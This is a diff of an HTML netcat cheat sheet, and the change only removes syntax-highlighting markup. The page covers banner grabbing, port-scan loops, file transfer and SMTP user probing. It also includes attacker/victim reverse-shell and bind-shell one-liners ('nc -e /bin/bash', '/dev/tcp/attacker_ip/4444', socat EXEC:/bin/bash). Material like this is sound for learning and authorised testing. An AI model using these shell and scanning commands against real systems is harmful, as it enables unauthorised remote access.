@@ -87,17 +87,6 @@
         a:hover {
             text-decoration: underline;
         }
-        /* Force all syntax highlighting spans to black */
-        .codehilite pre span,
-        .codehilite pre span.c, .codehilite pre span.c1, .codehilite pre span.ch,
-        .codehilite pre span.k, .codehilite pre span.kd, .codehilite pre span.kr,
-        .codehilite pre span.m, .codehilite pre span.mi,
-        .codehilite pre span.n, .codehilite pre span.nb, .codehilite pre span.nc, .codehilite pre span.nf, .codehilite pre span.nv,
-        .codehilite pre span.o,
-        .codehilite pre span.p, .codehilite pre span.py,
-        .codehilite pre span.s, .codehilite pre span.s1, .codehilite pre span.s2, .codehilite pre span.se,
-        .codehilite pre span.w { color: #000000 !important; }
-        pre span { color: #000000 !important; }
         @media print {
             body { margin: 0; padding: 10px; }
             pre { page-break-inside: avoid; }
@@ -132,17 +121,17 @@
 <h3 id="cachyos-arch-linux">CachyOS (Arch Linux)</h3>
 
 <div class="codehilite">
-<pre><span></span><code>sudo<span class="w"> </span>pacman<span class="w"> </span>-S<span class="w"> </span>gnu-netcat
-nc<span class="w"> </span>--version<span class="w">  </span><span class="c1"># or nc -h</span>
-which<span class="w"> </span>nc
+<pre><code>sudo pacman -S gnu-netcat
+nc --version  # or nc -h
+which nc
 </code></pre>
 </div>
 
 <h3 id="verify-installation">Verify Installation</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Test basic functionality:</span>
-<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;test&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>localhost<span class="w"> </span><span class="m">22</span><span class="w">  </span><span class="c1"># Try to connect to SSH</span>
+<pre><code># Test basic functionality:
+echo &quot;test&quot; | nc localhost 22  # Try to connect to SSH
 </code></pre>
 </div>
 
@@ -186,7 +175,7 @@ which<span class="w"> </span>nc
 <p>Identify running services by connecting and reading banners.</p>
 
 <div class="codehilite">
-<pre><span></span><code>nc<span class="w"> </span>-v<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">22</span>
+<pre><code>nc -v 192.168.1.100 22
 </code></pre>
 </div>
 
@@ -206,10 +195,10 @@ SSH-2.0-OpenSSH_7.4
 <p>Connect to HTTP and read server information.</p>
 
 <div class="codehilite">
-<pre><span></span><code>nc<span class="w"> </span>-v<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">80</span>
-<span class="c1"># Then type:</span>
-GET<span class="w"> </span>/<span class="w"> </span>HTTP/1.0
-<span class="c1"># Press Enter twice</span>
+<pre><code>nc -v 192.168.1.100 80
+# Then type:
+GET / HTTP/1.0
+# Press Enter twice
 </code></pre>
 </div>
 
@@ -224,7 +213,7 @@ Date: Mon, 10 Jan 2022 10:30:00 GMT
 <p><strong>Or in one command:</strong></p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;GET / HTTP/1.0\n\n&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-v<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">80</span>
+<pre><code>echo &quot;GET / HTTP/1.0\n\n&quot; | nc -v 192.168.1.100 80
 </code></pre>
 </div>
 
@@ -233,11 +222,11 @@ Date: Mon, 10 Jan 2022 10:30:00 GMT
 <p>Test if ports are open (faster than nmap for quick checks).</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Single port:</span>
-nc<span class="w"> </span>-zv<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">80</span>
+<pre><code># Single port:
+nc -zv 192.168.1.100 80
 
-<span class="c1"># Multiple ports:</span>
-nc<span class="w"> </span>-zv<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">20</span>-25<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">443</span><span class="w"> </span><span class="m">3306</span>
+# Multiple ports:
+nc -zv 192.168.1.100 20-25 80 443 3306
 </code></pre>
 </div>
 
@@ -258,7 +247,7 @@ Ncat: Connected to 192.168.1.100:80 (TCP)!
 <p>Create a listener to receive incoming shell connections.</p>
 
 <div class="codehilite">
-<pre><span></span><code>nc<span class="w"> </span>-l<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-v
+<pre><code>nc -l -p 4444 -v
 </code></pre>
 </div>
 
@@ -279,13 +268,13 @@ Ncat: Connection from 192.168.1.50:54321.
 <h3 id="5-receive-reverse-shell">5. <strong>Receive Reverse Shell</strong></h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># On attacker machine (listening):</span>
-nc<span class="w"> </span>-l<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span>
+<pre><code># On attacker machine (listening):
+nc -l -p 4444
 
-<span class="c1"># On compromised system (connect back):</span>
-nc<span class="w"> </span>-e<span class="w"> </span>/bin/bash<span class="w"> </span><span class="m">192</span>.168.1.50<span class="w"> </span><span class="m">4444</span>
-<span class="c1"># Or if -e disabled:</span>
-/bin/bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/192.168.1.50/4444<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+# On compromised system (connect back):
+nc -e /bin/bash 192.168.1.50 4444
+# Or if -e disabled:
+/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.50/4444 0&gt;&amp;1
 </code></pre>
 </div>
 
@@ -294,11 +283,11 @@ nc<span class="w"> </span>-e<span class="w"> </span>/bin/bash<span class="w"> </
 <p>Service listens on target, attacker connects.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># On target (listening):</span>
-nc<span class="w"> </span>-l<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
+<pre><code># On target (listening):
+nc -l -p 4444 -e /bin/bash
 
-<span class="c1"># On attacker (connecting):</span>
-nc<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">4444</span>
+# On attacker (connecting):
+nc 192.168.1.100 4444
 </code></pre>
 </div>
 
@@ -307,22 +296,22 @@ nc<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> <
 <p>Send files over the network.</p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Receiving end:</span>
-nc<span class="w"> </span>-l<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>&gt;<span class="w"> </span>received_file.txt
+<pre><code># Receiving end:
+nc -l -p 4444 &gt; received_file.txt
 
-<span class="c1"># Sending end:</span>
-nc<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">4444</span><span class="w"> </span>&lt;<span class="w"> </span>file_to_send.txt
+# Sending end:
+nc 192.168.1.100 4444 &lt; file_to_send.txt
 </code></pre>
 </div>
 
 <p><strong>Or:</strong></p>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Receiving (with visual feedback):</span>
-nc<span class="w"> </span>-l<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>&gt;<span class="w"> </span>file.txt
+<pre><code># Receiving (with visual feedback):
+nc -l -p 4444 &gt; file.txt
 
-<span class="c1"># Sending:</span>
-cat<span class="w"> </span>file.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">4444</span>
+# Sending:
+cat file.txt | nc 192.168.1.100 4444
 </code></pre>
 </div>
 
@@ -331,8 +320,8 @@ cat<span class="w"> </span>file.txt<span class="w"> </span><span class="p">|</sp
 <p>Test UDP services.</p>
 
 <div class="codehilite">
-<pre><span></span><code>nc<span class="w"> </span>-u<span class="w"> </span>-v<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">53</span><span class="w">  </span><span class="c1"># DNS</span>
-nc<span class="w"> </span>-u<span class="w"> </span>-v<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">161</span><span class="w">  </span><span class="c1"># SNMP</span>
+<pre><code>nc -u -v 192.168.1.100 53  # DNS
+nc -u -v 192.168.1.100 161  # SNMP
 </code></pre>
 </div>
 
@@ -344,7 +333,7 @@ nc<span class="w"> </span>-u<span class="w"> </span>-v<span class="w"> </span><s
 <p>Close connection after inactivity.</p>
 
 <div class="codehilite">
-<pre><span></span><code>nc<span class="w"> </span>-v<span class="w"> </span>-w<span class="w"> </span><span class="m">5</span><span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">80</span>
+<pre><code>nc -v -w 5 192.168.1.100 80
 </code></pre>
 </div>
 
@@ -356,7 +345,7 @@ nc<span class="w"> </span>-u<span class="w"> </span>-v<span class="w"> </span><s
 <p>Send broadcast packets.</p>
 
 <div class="codehilite">
-<pre><span></span><code>nc<span class="w"> </span>-u<span class="w"> </span>-b<span class="w"> </span><span class="m">255</span>.255.255.255<span class="w"> </span><span class="m">500</span>
+<pre><code>nc -u -b 255.255.255.255 500
 </code></pre>
 </div>
 
@@ -436,44 +425,44 @@ nc<span class="w"> </span>-u<span class="w"> </span>-v<span class="w"> </span><s
 <h3 id="scenario-1-service-discovery">Scenario 1: Service Discovery</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Find running services on a host:</span>
-<span class="k">for</span><span class="w"> </span>port<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">21</span><span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">53</span><span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">110</span><span class="w"> </span><span class="m">143</span><span class="w"> </span><span class="m">389</span><span class="w"> </span><span class="m">443</span><span class="w"> </span><span class="m">445</span><span class="w"> </span><span class="m">1433</span><span class="w"> </span><span class="m">3306</span><span class="w"> </span><span class="m">3389</span><span class="w"> </span><span class="m">5432</span><span class="w"> </span><span class="m">5900</span><span class="w"> </span><span class="m">8080</span><span class="w"> </span><span class="m">8443</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Testing port </span><span class="nv">$port</span><span class="s2">:&quot;</span>
-<span class="w">  </span>timeout<span class="w"> </span><span class="m">1</span><span class="w"> </span>nc<span class="w"> </span>-zv<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="nv">$port</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;succeeded\|open\|refused&quot;</span>
-<span class="k">done</span>
+<pre><code># Find running services on a host:
+for port in 21 22 23 25 53 80 110 143 389 443 445 1433 3306 3389 5432 5900 8080 8443; do
+  echo &quot;Testing port $port:&quot;
+  timeout 1 nc -zv 192.168.1.100 $port 2&gt;&amp;1 | grep -i &quot;succeeded\|open\|refused&quot;
+done
 </code></pre>
 </div>
 
 <h3 id="scenario-2-collect-service-banners">Scenario 2: Collect Service Banners</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Get banners from multiple services:</span>
-<span class="k">for</span><span class="w"> </span>port<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">110</span><span class="w"> </span><span class="m">143</span><span class="w"> </span><span class="m">3306</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;=== Port </span><span class="nv">$port</span><span class="s2"> ===&quot;</span>
-<span class="w">  </span>timeout<span class="w"> </span><span class="m">1</span><span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;echo &#39;&#39; | nc 192.168.1.100 </span><span class="nv">$port</span><span class="s2">&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
-<span class="k">done</span>
+<pre><code># Get banners from multiple services:
+for port in 22 25 80 110 143 3306; do
+  echo &quot;=== Port $port ===&quot;
+  timeout 1 bash -c &quot;echo &#39;&#39; | nc 192.168.1.100 $port&quot; 2&gt;/dev/null
+done
 </code></pre>
 </div>
 
 <h3 id="scenario-3-shell-callback-setup">Scenario 3: Shell Callback Setup</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Attacker prepares listener:</span>
-nc<span class="w"> </span>-l<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-v
+<pre><code># Attacker prepares listener:
+nc -l -p 4444 -v
 
-<span class="c1"># Victim (after compromised) connects back:</span>
-<span class="c1"># nc -e /bin/bash attacker_ip 4444</span>
+# Victim (after compromised) connects back:
+# nc -e /bin/bash attacker_ip 4444
 </code></pre>
 </div>
 
 <h3 id="scenario-4-quick-reverse-shell-creation">Scenario 4: Quick Reverse Shell Creation</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># One-liner for reverse shell (if target has nc):</span>
-bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/attacker_ip/4444<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+<pre><code># One-liner for reverse shell (if target has nc):
+bash -i &gt;&amp; /dev/tcp/attacker_ip/4444 0&gt;&amp;1
 
-<span class="c1"># Or with netcat:</span>
-nc<span class="w"> </span>-e<span class="w"> </span>/bin/sh<span class="w"> </span>attacker_ip<span class="w"> </span><span class="m">4444</span>
+# Or with netcat:
+nc -e /bin/sh attacker_ip 4444
 </code></pre>
 </div>
 
@@ -484,12 +473,12 @@ nc<span class="w"> </span>-e<span class="w"> </span>/bin/sh<span class="w"> </sp
 <h3 id="example-1-http-banner-grabbing">Example 1: HTTP Banner Grabbing</h3>
 
 <div class="codehilite">
-<pre><span></span><code>$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;GET / HTTP/1.0\r\n\r\n&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span><span class="m">192</span>.168.1.50<span class="w"> </span><span class="m">80</span>
-HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
-Server:<span class="w"> </span>Apache/2.4.6<span class="w"> </span><span class="o">(</span>CentOS<span class="o">)</span>
-Date:<span class="w"> </span>Mon,<span class="w"> </span><span class="m">10</span><span class="w"> </span>Jan<span class="w"> </span><span class="m">2022</span><span class="w"> </span><span class="m">10</span>:30:00<span class="w"> </span>GMT
-Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8
-Content-Length:<span class="w"> </span><span class="m">1234</span>
+<pre><code>$ echo -e &quot;GET / HTTP/1.0\r\n\r\n&quot; | nc 192.168.1.50 80
+HTTP/1.1 200 OK
+Server: Apache/2.4.6 (CentOS)
+Date: Mon, 10 Jan 2022 10:30:00 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 1234
 ...
 </code></pre>
 </div>
@@ -497,34 +486,34 @@ Content-Length:<span class="w"> </span><span class="m">1234</span>
 <h3 id="example-2-smtp-banner-grabbing">Example 2: SMTP Banner Grabbing</h3>
 
 <div class="codehilite">
-<pre><span></span><code>$<span class="w"> </span>nc<span class="w"> </span>-v<span class="w"> </span><span class="m">192</span>.168.1.50<span class="w"> </span><span class="m">25</span>
-Ncat:<span class="w"> </span>Version<span class="w"> </span><span class="m">7</span>.91
-Ncat:<span class="w"> </span>Connected<span class="w"> </span>to<span class="w"> </span><span class="m">192</span>.168.1.50:25
-<span class="m">220</span><span class="w"> </span>mail.example.com<span class="w"> </span>ESMTP<span class="w"> </span>Postfix
+<pre><code>$ nc -v 192.168.1.50 25
+Ncat: Version 7.91
+Ncat: Connected to 192.168.1.50:25
+220 mail.example.com ESMTP Postfix
 
-<span class="c1"># Can then send VRFY commands:</span>
-VRFY<span class="w"> </span>user1
-<span class="c1"># May reveal user exists</span>
+# Can then send VRFY commands:
+VRFY user1
+# May reveal user exists
 </code></pre>
 </div>
 
 <h3 id="example-3-quick-listener-for-reverse-shell">Example 3: Quick Listener for Reverse Shell</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Terminal 1 (Attacker - Listener):</span>
-$<span class="w"> </span>nc<span class="w"> </span>-l<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-v
-Ncat:<span class="w"> </span>Version<span class="w"> </span><span class="m">7</span>.91
-Ncat:<span class="w"> </span>Listening<span class="w"> </span>on<span class="w"> </span><span class="m">0</span>.0.0.0:4444
-Ncat:<span class="w"> </span>Connection<span class="w"> </span>from<span class="w"> </span><span class="m">192</span>.168.1.100.
-Ncat:<span class="w"> </span>Connection<span class="w"> </span>from<span class="w"> </span><span class="m">192</span>.168.1.100:54321.
+<pre><code># Terminal 1 (Attacker - Listener):
+$ nc -l -p 4444 -v
+Ncat: Version 7.91
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 192.168.1.100.
+Ncat: Connection from 192.168.1.100:54321.
 
-<span class="c1"># Now attacker has shell access (shell commands execute here)</span>
-$<span class="w"> </span>whoami
+# Now attacker has shell access (shell commands execute here)
+$ whoami
 root
 
-<span class="c1"># Terminal 2 (Victim - Connector):</span>
-$<span class="w"> </span>nc<span class="w"> </span>-e<span class="w"> </span>/bin/bash<span class="w"> </span><span class="m">192</span>.168.1.50<span class="w"> </span><span class="m">4444</span>
-<span class="c1"># Connection established, commands sent to Terminal 1</span>
+# Terminal 2 (Victim - Connector):
+$ nc -e /bin/bash 192.168.1.50 4444
+# Connection established, commands sent to Terminal 1
 </code></pre>
 </div>
 
@@ -535,33 +524,33 @@ $<span class="w"> </span>nc<span class="w"> </span>-e<span class="w"> </span>/bi
 <h3 id="banner-grabbing-one-liners">Banner Grabbing One-Liners</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Get SSH banner:</span>
-<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-v<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-1
+<pre><code># Get SSH banner:
+echo &quot;&quot; | nc -v 192.168.1.100 22 2&gt;&amp;1 | head -1
 
-<span class="c1"># Get HTTP Server header:</span>
-<span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;GET / HTTP/1.0\r\n\r\n&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;Server:&quot;</span>
+# Get HTTP Server header:
+echo -e &quot;GET / HTTP/1.0\r\n\r\n&quot; | nc 192.168.1.100 80 | grep -i &quot;Server:&quot;
 
-<span class="c1"># Get FTP banner:</span>
-<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-v<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">21</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-1
+# Get FTP banner:
+echo &quot;&quot; | nc -v 192.168.1.100 21 2&gt;&amp;1 | head -1
 
-<span class="c1"># Rapid multi-port check:</span>
-<span class="k">for</span><span class="w"> </span>port<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">21</span><span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">53</span><span class="w"> </span><span class="m">80</span><span class="w"> </span><span class="m">110</span><span class="w"> </span><span class="m">143</span><span class="w"> </span><span class="m">389</span><span class="w"> </span><span class="m">443</span><span class="w"> </span><span class="m">445</span><span class="w"> </span><span class="m">3306</span><span class="w"> </span><span class="m">3389</span><span class="w"> </span><span class="m">5432</span><span class="w"> </span><span class="m">5900</span><span class="w"> </span><span class="m">8080</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span><span class="o">(</span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>-zv<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="nv">$port</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;succeeded&quot;</span><span class="o">)</span><span class="w"> </span><span class="p">&amp;</span>
-<span class="k">done</span>
-<span class="nb">wait</span>
+# Rapid multi-port check:
+for port in 20 21 22 23 25 53 80 110 143 389 443 445 3306 3389 5432 5900 8080; do
+  (echo &quot;&quot; | nc -zv 192.168.1.100 $port 2&gt;&amp;1 | grep -i &quot;succeeded&quot;) &amp;
+done
+wait
 </code></pre>
 </div>
 
 <h3 id="performance-tips">Performance Tips</h3>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># Speed up scanning with timeout:</span>
-<span class="k">for</span><span class="w"> </span>port<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">{</span><span class="m">20</span>..443<span class="o">}</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span>timeout<span class="w"> </span><span class="m">0</span>.1<span class="w"> </span>bash<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;echo &#39;&#39; &gt; /dev/tcp/192.168.1.100/</span><span class="nv">$port</span><span class="s2">&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Port </span><span class="nv">$port</span><span class="s2"> open&quot;</span>
-<span class="k">done</span>
+<pre><code># Speed up scanning with timeout:
+for port in {20..443}; do
+  timeout 0.1 bash -c &quot;echo &#39;&#39; &gt; /dev/tcp/192.168.1.100/$port&quot; 2&gt;/dev/null &amp;&amp; echo &quot;Port $port open&quot;
+done
 
-<span class="c1"># Use -n to skip DNS:</span>
-nc<span class="w"> </span>-zn<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">22</span><span class="w">  </span><span class="c1"># Faster, no DNS lookup</span>
+# Use -n to skip DNS:
+nc -zn 192.168.1.100 22  # Faster, no DNS lookup
 </code></pre>
 </div>
 
@@ -579,14 +568,14 @@ PostgreSQL: 5432 | VNC: 5900   | Tomcat: 8080
 <h2 id="netcat-alternatives-modern">Netcat Alternatives (Modern)</h2>
 
 <div class="codehilite">
-<pre><span></span><code><span class="c1"># ncat (Nmap&#39;s netcat):</span>
-ncat<span class="w"> </span>-l<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span>
+<pre><code># ncat (Nmap&#39;s netcat):
+ncat -l -p 4444
 
-<span class="c1"># socat (more features):</span>
-socat<span class="w"> </span>TCP-LISTEN:4444,reuseaddr<span class="w"> </span>EXEC:/bin/bash
+# socat (more features):
+socat TCP-LISTEN:4444,reuseaddr EXEC:/bin/bash
 
-<span class="c1"># telnet (for banner grabbing):</span>
-telnet<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">80</span>
+# telnet (for banner grabbing):
+telnet 192.168.1.100 80
 </code></pre>
 </div>
 
